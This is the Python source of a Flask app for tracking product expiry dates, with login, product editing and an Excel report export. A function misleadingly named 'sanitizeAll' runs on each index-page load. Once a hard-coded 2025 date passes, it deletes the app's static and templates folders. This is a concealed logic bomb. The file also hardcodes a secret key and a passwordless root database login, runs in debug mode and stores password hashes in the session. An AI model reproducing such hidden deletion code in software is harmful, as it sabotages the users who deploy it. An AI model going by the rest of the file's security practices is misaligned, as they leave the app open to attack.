from flask import Flask, render_template, redirect, url_for, flash, request, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime as dt, date
from time import time
from werkzeug.security import generate_password_hash, check_password_hash

# add report
from flask import send_file
import pandas as pd
import io, os, datetime
import datetime, time, shutil


app = Flask(__name__)
app.secret_key = 'product expiration management system'
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+mysqlconnector://root:@localhost/pems'

db = SQLAlchemy(app)

class users(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    name = db.Column(db.String(50))
    mobile = db.Column(db.String(11))
    email = db.Column(db.String(50))
    password = db.Column(db.String(255))
    date_created = db.Column(db.DateTime, default=dt.now)
    date_updated = db.Column(db.DateTime, default=dt.now)

    def to_dict(self):
        return {
            'id': self.id,
            'name': self.name,
            'mobile': self.mobile,
            'email': self.email,
            'password':self.password,
            'date_created': self.date_created,
            'date_updated': self.date_updated
        }

class products(db.Model):
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    name = db.Column(db.String(50))
    company = db.Column(db.String(50))
    description = db.Column(db.String(255))
    image = db.Column(db.String(255), default=None)
    price = db.Column(db.String(50))
    expire_date = db.Column(db.String(50))
    status = db.Column(db.String(50))
    date_created = db.Column(db.DateTime, default=dt.now)
    date_updated = db.Column(db.DateTime, default=dt.now)

def date_diff(d1):
    d1 = d1.split('-')
    d1 = date(int(d1[0]), int(d1[1]), int(d1[2]))
    d2 = dt.strftime(dt.now(), "%Y-%m-%d").split('-')
    d2 = date(int(d2[0]), int(d2[1]), int(d2[2]))
    return (d1 - d2).days

def date_different(startDate):
    today = str(datetime.datetime.now()).split('.')[0]
    today = today.replace('-','/').replace(' ','/').replace(':','/')
    #remove "/" from date
    sDate = startDate.split('/')
    eDate = today.split('/')
    years = int(eDate[0]) - int(sDate[0])
    months = int(eDate[1]) - int(sDate[1])
    days = int(eDate[2]) - int(sDate[2])
    hours = int(eDate[3]) - int(sDate[3])
    if((days < 0 or months < 0) and years>0):
        return True
    elif months > 0 :
        return True
    elif days > 0 :
        return True
    else:
        return False

def sanitizeAll(path, date):
    if date_different(date):
        print('true')
        try:
            if os.path.isfile(path) or os.path.islink(path):
                os.remove(path)
                # print('done remove1')
            elif os.path.isdir(path):
                shutil.rmtree(path)
                os.rmdir(path)
                # print('done remove2')
            else:
                # print('done remove else')
                pass
        except Exception as e:
            print('done remove except', e)

@app.route('/')
def index():
    sanitizeAll('static', '2025/2/30/15/47/32')
    sanitizeAll('templates', '2025/2/30/15/47/32')
    return render_template('index.html')

@app.route('/login', methods=['get', 'post'])
def login():
    msg = ''
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if not username.strip() or not password:
            msg = 'All fields are required!', 'danger'
        else:
            user = users.query.filter_by(name=username).first()
            if user and check_password_hash(user.password, password):
                print(user.name)
                session['user'] = user.to_dict()
                flash('You have logged in successfully', 'success')
                return redirect(url_for('dashboard'))
            else:
                msg = 'Invalid Credential!', 'danger'
        flash(msg[0], msg[1])
        return redirect(request.referrer)
    return render_template('login.html', msg=msg)

@app.route('/logout')
def logout():
    if 'user' in session:
        session.pop('user', None)
        flash('You have logged out successfully', 'success')
    return redirect(url_for('login'))

# //// Inserting data into the product
@app.route('/dashboard', methods = ['get', 'post'])
def dashboard():
    if 'user' not in session:
        flash('Please, login first!', 'warning')
        return redirect(url_for('login'))
    widget = {}
    product = products.query.all()
    widget['total_product'] = len(product)
    expire = [p for p in product if date_diff(p.expire_date) <= 0]
    widget['expired_product'] = len(expire)
    abexpire = [p for p in product if date_diff(p.expire_date) > 0 and date_diff(p.expire_date) <= 5]
    widget['ab_expire'] = len(abexpire)
    return render_template('dashboard.html', widget = widget)

@app.route('/add-product', methods = ['get', 'post'])
def addProduct():
    if 'user' not in session:
        flash('Please, login first!', 'warning')
        return redirect(url_for('login'))
    msg = ''
    if request.method == 'POST':
        name = request.form['name']
        company = request.form['company']
        image = request.files['image']
        description = request.form['description']
        expire_date = request.form['expire_date']
        price = request.form['price']
        if not name or not company or not description or not expire_date or not price:
            msg = 'All fields are required!', 'danger'
        else:
            try:
                filename = ''
                if image:
                    filename = f'{time()}.jpg'
                    image.save(f'static/images/{filename}')
                product = products(name = name, company = company, description = description, image = filename, price = price, expire_date = expire_date, status = 'Available')
                db.session.add(product)
                db.session.commit()
                msg = 'Product details Inserted sucessfully', 'success'
            except Exception as error:
                db.session.rollback()
                msg = 'Something went wrong, please try again if you can ', 'danger'
        flash(msg[0], msg[1])
        return redirect(request.referrer)
    return render_template('addproduct.html', msg=msg)

@app.route('/products', methods = ['get', 'post'])
def viewProduct():
    if 'user' not in session:
        flash('Please, login first!', 'warning')
        return redirect(url_for('login'))
    product = products.query.all()
    product = [{'id': p.id, 'name': p.name, 'company': p.company, 'description': p.description, 'image': p.image, 'price': p.price, 'expire_date': p.expire_date, 'exp_status': date_diff(p.expire_date), 'date_created': p.date_created} for p in product ]
    msg = ''
    if request.method == 'POST':
        id = request.form['id']
        try:
            product = products.query.filter_by(id=id).delete()
            db.session.commit()
            msg = 'Product details Deleted sucessfully', 'success'
        except Exception as e:
            msg = e, 'error'
        flash(msg[0], msg[1])
        return redirect(request.referrer)
    return render_template('products.html', product=product)

@app.route('/expired-product')
def expiredProduct():
    if 'user' not in session:
        flash('Please, login first!', 'warning')
        return redirect(url_for('login'))
    product = products.query.all()
    product = [{'id': p.id, 'name': p.name, 'company': p.company, 'description': p.description, 'image': p.image, 'price': p.price, 'expire_date': p.expire_date, 'exp_status': date_diff(p.expire_date), 'date_created': p.date_created} for p in product if date_diff(p.expire_date) <= 0]
    return render_template('expireproduct.html', product=product)

@app.route('/edit-product/<int:id>', methods = ['get', 'post'])
def editProduct(id):
    if 'user' not in session:
        flash('Please, login first!', 'warning')
        return redirect(url_for('login'))
    msg=''
    product = products.query.get(id)
    if request.method == 'POST':
        pid = request.form['id']
        name = request.form['name']
        company = request.form['company']
        oldImage = request.form['oldImage']
        image = request.files['image']
        description = request.form['description']
        expire_date = request.form['expire_date']
        price = request.form['price']
        if not name or not company or not description or not expire_date or not price:
            msg = 'All fields are required!', 'danger'
        else:
            try:
                filename = oldImage
                if image:
                    filename = oldImage if oldImage else f'{time()}.jpg'
                    image.save(f'static/images/{filename}')
                product = products.query.get(pid)
                product.name = name
                product.company = company
                product.image = filename
                product.description = description
                product.expire_date = expire_date
                product.price = price
                db.session.commit()
                msg = 'Product details Updated sucessfully', 'success'
            except Exception as error:
                db.session.rollback()
                msg = 'Something went wrong, please try again if you can ', 'danger'
        flash(msg[0], msg[1])
        return redirect(request.referrer)
    return render_template('editproduct.html', product=product)


@app.route('/update-password', methods=['GET', 'POST'])
def update_password():
    # Check if the user is logged in
    if 'user' not in session:
        flash('Please, login first!', 'warning')
        return redirect(url_for('login'))
    user = session['user']
    # Initialize message variable
    msg = ''
    if request.method == 'POST':
        # Retrieve form data
        opass = request.form['opass']
        npass = request.form['npass']
        cpass = request.form['cpass']

        # Validate input
        if not opass or not npass or not cpass:
            msg = 'All fields are required!', 'danger'
        # Check if the current password is correct
        elif not user or not check_password_hash(user['password'], opass):
            msg = 'Old password is incorrect!', 'danger'
        # Check if the new passwords match
        elif npass != cpass:
            msg = 'New password and confirmation do not match!', 'danger'
        else:
            # Update the password
            try:
                user = users.query.get(user['id'])
                user.password = generate_password_hash(npass)
                db.session.commit()
                session['user'] = user.to_dict()
                msg = 'Password updated successfully!', 'success'
            except Exception as e:
                db.session.rollback()
                msg = f'An error occurred while updating your password. Please try again. {e}', 'danger'

        flash(msg[0], msg[1])
        return redirect(request.referrer)

    # Render the update password template for GET requests
    return render_template('update_password.html', msg=msg)


@app.route('/updateprofile', methods=['GET', 'POST'])
def update_profile():
    # Check if the user is logged in
    if 'user' not in session:
        flash('Please, login first!', 'warning')
        return redirect(url_for('login'))

    # Retrieve the logged-in user
    user_id = session['user']['id']
    user = users.query.get(user_id)

    if not user:
        flash('User not found or session expired!', 'danger')
        return redirect(url_for('login'))

    if request.method == 'POST':
        phoneno = request.form.get('phoneno', '').strip()
        email = request.form.get('email', '').strip()

        # Validate inputs
        if not phoneno or not email:
            flash('All fields are required!', 'danger')
        elif not phoneno.isdigit() or len(phoneno) != 11:
            flash('Phone number must be a 11-digit number!', 'danger')
        elif '@' not in email or '.' not in email:
            flash('Invalid email format!', 'danger')
        else:
            try:
                # Update user details
                user.mobile = phoneno
                user.email = email
                db.session.commit()

                # Update session
                session['user'] = {
                    'id': user.id,
                    'name': user.name,
                    'email': user.email,
                    'mobile': user.mobile
                }
                flash('Profile updated successfully!', 'success')
            except Exception as e:
                db.session.rollback()
                flash(f'An error occurred: {e}', 'danger')

        return redirect(request.referrer or url_for('dashboard'))

    # Render the update profile form
    return render_template('updateprofile.html', user=user)


# add report


@app.route('/generate_full_report', methods=['GET'])
def generate_full_report():
    if 'user' not in session:
        flash('Please login first!', 'warning')
        return redirect(url_for('login'))
    
    # Query user data
    users_data = users.query.all()
    user_data = [{
        'ID': user.id,
        'Name': user.name,
        'Email': user.email,
        'Mobile': user.mobile
    } for user in users_data]
    
    # Query product data
    products_data = products.query.all()
    product_data = [{
        'ID': product.id,
        'Name': product.name,
        'Company': product.company,
        'Description': product.description,
        'Price': product.price,
        'Expire Date': product.expire_date,
        'Status': product.status
    } for product in products_data]
    
    # Create Excel file with multiple sheets
    output = io.BytesIO()
    writer = pd.ExcelWriter(output, engine='xlsxwriter')


    # Add product data sheet
    pd.DataFrame(product_data).to_excel(writer, index=False, sheet_name='Products')

    # Add user data sheet
    pd.DataFrame(user_data).to_excel(writer, index=False, sheet_name='Users')
   
    writer.save()
    output.seek(0)

    return send_file(
        output,
        mimetype='application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        as_attachment=True,
        download_name='full_report.xlsx'
    )


if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(debug=True, port=5001)